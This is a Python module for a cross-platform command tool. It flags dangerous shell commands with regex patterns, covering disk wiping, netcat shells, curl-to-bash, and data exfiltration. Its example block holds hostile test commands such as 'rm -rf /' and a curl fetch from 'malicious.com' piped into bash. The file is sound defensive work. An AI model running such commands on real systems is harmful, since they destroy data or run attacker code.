"""
Security validation module for cross-platform commands.
Detects dangerous commands and assesses security risks.
"""

from typing import Dict, List, Any, Tuple
import re


class SecurityValidator:
    """Validate command security and identify potential risks."""

    # Dangerous command patterns by category
    DANGEROUS_PATTERNS = {
        "destructive_operations": {
            "patterns": [
                r'rm\s+-rf\s+/',
                r'rm\s+-rf\s+\*',
                r'del\s+/[fs]\s+\*',
                r'format\s+[a-z]:',
                r'Remove-Item\s+.*-Recurse.*-Force',
                r'rd\s+/s\s+/q\s+[a-z]:',
                r'mkfs\.',
                r'dd\s+if=/dev/zero\s+of=/dev/sd',
                r':\s*>\s*/dev/sd'
            ],
            "risk_level": "critical",
            "description": "可能导致数据丢失的破坏性操作"
        },
        "privilege_escalation": {
            "patterns": [
                r'sudo\s+su\s*-',
                r'sudo\s+-i',
                r'runas\s+/user:administrator',
                r'Set-ExecutionPolicy\s+Bypass',
                r'chmod\s+[u+]?s\s+',
                r'chown\s+root',
                r'Start-Process.*-Verb\s+RunAs'
            ],
            "risk_level": "high",
            "description": "权限提升操作,可能获得超级用户权限"
        },
        "system_modification": {
            "patterns": [
                r'chmod\s+777',
                r'chattr\s+-i',
                r'setenforce\s+0',
                r'systemctl\s+disable',
                r'reg\s+delete',
                r'sc\s+delete',
                r'Set-Service.*-StartupType\s+Disabled'
            ],
            "risk_level": "high",
            "description": "修改系统配置或安全设置"
        },
        "network_security": {
            "patterns": [
                r'iptables\s+-F',
                r'ufw\s+disable',
                r'netsh\s+firewall\s+set\s+opmode\s+disable',
                r'Set-NetFirewallProfile.*-Enabled\s+False',
                r'nc\s+-l.*-e',
                r'ncat.*--exec',
                r'curl\s+.*\|\s*bash',
                r'wget\s+.*\|\s*sh'
            ],
            "risk_level": "high",
            "description": "禁用防火墙或执行远程脚本"
        },
        "data_exfiltration": {
            "patterns": [
                r'scp\s+.*\s+\w+@[\w\.]+:',
                r'rsync\s+.*\s+\w+@[\w\.]+:',
                r'curl\s+-X\s+POST.*--data-binary',
                r'Invoke-WebRequest.*-Method\s+POST.*-Body',
                r'tar\s+.*\|\s*ssh',
                r'mysqldump\s+.*\|\s*ssh'
            ],
            "risk_level": "medium",
            "description": "可能的数据传输或导出操作"
        },
        "process_injection": {
            "patterns": [
                r'gdb\s+.*-p\s+\d+',
                r'ptrace',
                r'Invoke-ReflectivePEInjection',
                r'Start-Process.*-WindowStyle\s+Hidden',
                r'/proc/\d+/mem'
            ],
            "risk_level": "high",
            "description": "进程注入或调试操作"
        }
    }

    # Privileged commands that require elevated permissions
    PRIVILEGED_COMMANDS = {
        "linux": [
            "sudo", "su", "pkexec", "doas", "mount", "umount",
            "systemctl", "service", "iptables", "ufw", "modprobe"
        ],
        "macos": [
            "sudo", "su", "dscl", "diskutil", "launchctl", "pfctl"
        ],
        "windows": [
            "runas", "Set-ExecutionPolicy", "New-Service", "Stop-Service",
            "Start-Service", "Install-WindowsFeature", "Enable-WindowsOptionalFeature"
        ]
    }

    def __init__(self):
        """Initialize security validator."""
        self.validation_results = {}

    def check_dangerous_commands(self, command: str) -> List[Dict[str, str]]:
        """
        Check if command contains dangerous patterns.

        Args:
            command: Command string to validate

        Returns:
            List of detected dangerous patterns with details
        """
        detected_risks = []

        for category, config in self.DANGEROUS_PATTERNS.items():
            for pattern in config["patterns"]:
                if re.search(pattern, command, re.IGNORECASE):
                    detected_risks.append({
                        "category": category,
                        "pattern": pattern,
                        "risk_level": config["risk_level"],
                        "description": config["description"],
                        "matched_text": re.search(pattern, command, re.IGNORECASE).group(0)
                    })

        return detected_risks

    def assess_risk_level(self, command: str) -> Tuple[str, List[str]]:
        """
        Assess overall risk level of command.

        Args:
            command: Command to assess

        Returns:
            Tuple of (risk_level, warnings_list)
        """
        dangerous_patterns = self.check_dangerous_commands(command)

        if not dangerous_patterns:
            return ("safe", [])

        # Determine highest risk level
        risk_levels = {"safe": 0, "low": 1, "medium": 2, "high": 3, "critical": 4}
        max_risk = "safe"
        warnings = []

        for pattern in dangerous_patterns:
            risk = pattern["risk_level"]
            if risk_levels[risk] > risk_levels[max_risk]:
                max_risk = risk

            warnings.append(
                f"[{pattern['risk_level'].upper()}] {pattern['description']}: {pattern['matched_text']}"
            )

        return (max_risk, warnings)

    def privilege_required(self, command: str, platform: str) -> bool:
        """
        Check if command requires elevated privileges.

        Args:
            command: Command to check
            platform: Target platform (linux, macos, windows)

        Returns:
            True if privileges required
        """
        if platform not in self.PRIVILEGED_COMMANDS:
            return False

        privileged_cmds = self.PRIVILEGED_COMMANDS[platform]

        # Check if any privileged command is in the command string
        for priv_cmd in privileged_cmds:
            # Match whole word to avoid false positives
            pattern = r'\b' + re.escape(priv_cmd) + r'\b'
            if re.search(pattern, command, re.IGNORECASE):
                return True

        return False

    def validate_input_safety(self, user_input: str) -> Dict[str, Any]:
        """
        Validate user input for command injection attempts.

        Args:
            user_input: User-provided input string

        Returns:
            Validation result with safety status and warnings
        """
        injection_patterns = [
            r';\s*rm\s+',
            r'\|\s*rm\s+',
            r'&&\s*rm\s+',
            r'`.*`',
            r'\$\(.*\)',
            r'>\s*/dev/sd',
            r'\|\s*bash',
            r'\|\s*sh',
            r';\s*curl.*\|',
            r';\s*wget.*\|'
        ]

        detected_injections = []

        for pattern in injection_patterns:
            matches = re.finditer(pattern, user_input, re.IGNORECASE)
            for match in matches:
                detected_injections.append({
                    "pattern": pattern,
                    "matched_text": match.group(0),
                    "position": match.span(),
                    "warning": "可能的命令注入尝试"
                })

        is_safe = len(detected_injections) == 0

        return {
            "is_safe": is_safe,
            "risk_level": "high" if detected_injections else "safe",
            "detected_injections": detected_injections,
            "sanitized_input": self._sanitize_input(user_input) if not is_safe else user_input
        }

    def _sanitize_input(self, user_input: str) -> str:
        """
        Sanitize user input by escaping dangerous characters.

        Args:
            user_input: User input to sanitize

        Returns:
            Sanitized input string
        """
        # Escape shell metacharacters
        dangerous_chars = ['|', ';', '&', '$', '`', '\n', '(', ')', '<', '>']

        sanitized = user_input
        for char in dangerous_chars:
            sanitized = sanitized.replace(char, '\\' + char)

        return sanitized

    def generate_security_report(self, commands: Dict[str, Any]) -> Dict[str, Any]:
        """
        Generate comprehensive security report for a set of commands.

        Args:
            commands: Dictionary of platform commands

        Returns:
            Security report with risk assessment
        """
        report = {
            "overall_risk": "safe",
            "platforms_analyzed": [],
            "security_warnings": [],
            "privilege_requirements": {},
            "recommendations": []
        }

        risk_levels = {"safe": 0, "low": 1, "medium": 2, "high": 3, "critical": 4}
        max_risk = "safe"

        # Analyze each platform's commands
        for platform, cmd_data in commands.get("platforms", {}).items():
            report["platforms_analyzed"].append(platform)

            # Get command string based on platform
            if platform in ["linux", "macos"]:
                command = cmd_data.get("command", "")
            elif platform == "windows":
                command = cmd_data.get("powershell", "") + " " + cmd_data.get("cmd", "")
            else:
                continue

            # Assess risk
            risk_level, warnings = self.assess_risk_level(command)
            if risk_levels[risk_level] > risk_levels[max_risk]:
                max_risk = risk_level

            # Check privileges
            needs_privilege = self.privilege_required(command, platform)
            report["privilege_requirements"][platform] = needs_privilege

            # Add warnings
            report["security_warnings"].extend(warnings)

        report["overall_risk"] = max_risk

        # Generate recommendations based on risk level
        if max_risk == "critical":
            report["recommendations"].extend([
                "命令包含严重危险操作,请务必在测试环境中验证",
                "建议人工审核命令内容",
                "执行前确保已备份重要数据",
                "仅在完全理解命令影响后执行"
            ])
        elif max_risk == "high":
            report["recommendations"].extend([
                "命令包含高风险操作,请谨慎执行",
                "建议在测试环境中先行验证",
                "确保具有足够的权限和授权"
            ])
        elif max_risk == "medium":
            report["recommendations"].extend([
                "命令包含中等风险操作,建议审查后执行",
                "确保理解命令的具体作用"
            ])

        if any(report["privilege_requirements"].values()):
            report["recommendations"].append("部分命令需要管理员/root 权限")

        return report


def validate_command_security(command: str, platform: str = "linux") -> Dict[str, Any]:
    """
    Convenience function to validate a single command's security.

    Args:
        command: Command to validate
        platform: Target platform

    Returns:
        Security validation result
    """
    validator = SecurityValidator()

    risk_level, warnings = validator.assess_risk_level(command)
    needs_privilege = validator.privilege_required(command, platform)

    return {
        "command": command,
        "platform": platform,
        "risk_level": risk_level,
        "warnings": warnings,
        "requires_privilege": needs_privilege,
        "is_safe": risk_level in ["safe", "low"]
    }


# Example usage
if __name__ == "__main__":
    validator = SecurityValidator()

    # Test dangerous commands
    test_commands = [
        ("rm -rf /", "linux"),
        ("sudo chmod 777 /etc/passwd", "linux"),
        ("curl http://malicious.com/script.sh | bash", "linux"),
        ("ls -la", "linux"),
        ("Remove-Item C:\\ -Recurse -Force", "windows"),
        ("Get-Process", "windows")
    ]

    for cmd, platform in test_commands:
        print(f"\n{'='*60}")
        print(f"Command: {cmd}")
        print(f"Platform: {platform}")
        print(f"{'='*60}")

        result = validate_command_security(cmd, platform)

        print(f"Risk Level: {result['risk_level']}")
        print(f"Requires Privilege: {result['requires_privilege']}")
        print(f"Is Safe: {result['is_safe']}")

        if result['warnings']:
            print("\nWarnings:")
            for warning in result['warnings']:
                print(f"  - {warning}")
